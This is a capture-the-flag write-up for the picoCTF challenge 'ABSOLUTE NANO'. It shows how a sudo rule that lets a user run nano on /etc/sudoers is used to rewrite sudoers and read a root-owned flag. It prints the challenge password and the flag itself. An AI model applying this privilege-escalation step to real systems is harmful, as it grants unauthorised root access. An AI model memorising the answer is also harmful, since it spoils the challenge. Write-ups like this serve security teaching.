# Overview

#### We are now tackling `ABSOLUTE NANO`, it gives us credentials to user `ctf-player` inside `crystal-peak.picoctf.net`. We're going to deal with `nano` to get the flag that is owned by `root`.

> *Description of **ABSOLUTE NANO**:*
```
You have complete power with nano.

Think you can get the flag?
ssh -p 51241 ctf-player@crystal-peak.picoctf.net using password 9c805ca4
```

> *files inside **/home/ctf-player**:*
```
ctf-player@challenge:~$ ls -la
total 16
drwxr-xr-x 1 ctf-player ctf-player   20 May 10 23:46 .
drwxr-xr-x 1 root       root         24 Feb  4 22:26 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Feb 25  2020 .bashrc
drwx------ 2 ctf-player ctf-player   34 May 10 23:46 .cache
-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
-r--r----- 1 root       root         35 Feb  4 22:26 flag.txt
```

# Analysis

#### The `flag.txt` cannot be read using `cat`, but there has to be a way to read it right?
```
-r--r----- 1 root       root         35 Feb  4 22:26 flag.txt
ctf-player@challenge:~$ cat flag.txt
cat: flag.txt: Permission denied
```

> *Checking for commands that can be ran with privilege. `sudo -l`:*

```
ctf-player@challenge:~$ sudo -l
Matching Defaults entries for ctf-player on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
```

#### The `/bin/nano` command AKA [GNU nano](https://en.wikipedia.org/wiki/GNU_nano) is a CLI-based text editor. It allows users to write and edit files right in the command line. The output of `sudo -l` shows us that we can run `/bin/nano /etc/sudoers` with `sudo` which cannot be done without being `root` user. The `/etc/sudoers` file defines which users or groups are allowed to execute commands as another user (usually root).

> *Contents of **/etc/sudoers**:*

```
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
ctf-player ALL=(ALL) NOPASSWD: /bin/nano /etc/sudoers
```

# Solution

#### We can solve this challenge by modifying the `/etc/sudoers` so that we can `nano` the `flag.txt`.

```
User ctf-player may run the following commands on challenge:
    (ALL) NOPASSWD: /bin/nano /etc/sudoers
ctf-player@challenge:~$ sudo /bin/nano /etc/sudoers
```

> ***`sudo /bin/nano /etc/sudoers`:***

```
# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
ctf-player ALL=(ALL) NOPASSWD: /bin/nano flag.txt

                                         [ Wrote 31 lines ]
^G Get Help   ^O Write Out  ^W Where Is   ^K Cut Text   ^J Justify    ^C Cur Pos    M-U Undo
^X Exit       ^R Read File  ^\ Replace    ^U Paste Text ^T To Spell   ^_ Go To Line M-E Redo
```

#### And get the flag by running `sudo nano flag.txt`!

```
  GNU nano 4.8                           flag.txt
--------------------------------------------------------------------------------------------
picoCTF{n4n0_411_7h3_w4y_d74f446b}

                                      [ Read 1 line ]
^G Get Help   ^O Write Out  ^W Where Is   ^K Cut Text   ^J Justify    ^C Cur Pos    M-U Undo
^X Exit       ^R Read File  ^\ Replace    ^U Paste Text ^T To Spell   ^_ Go To Line M-E Redo
```
